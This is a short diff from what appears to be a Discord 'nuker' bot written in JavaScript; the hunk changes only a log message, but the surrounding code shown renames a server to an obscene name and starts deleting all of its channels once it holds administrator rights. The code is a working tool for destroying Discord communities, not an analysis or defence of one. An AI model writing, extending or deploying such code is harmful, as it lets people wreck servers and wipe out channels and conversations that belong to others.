@@ -267,7 +267,7 @@ client.on("message", async message => {
                 return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
             } else {
                 message.delete();
-                message.guild.setName(`GET FUCKED`).then(console.log(green(`Server Name changed to: ${message.guild.name} Wizzed`))); // changes server name
+                message.guild.setName(`GET FUCKED`).then(console.log(green(`Server Name changed to: ${message.guild.name}`))); // changes server name
 
                 // Channel Delete
                 message.guild.channels.cache.forEach(channel => channel.delete().then(
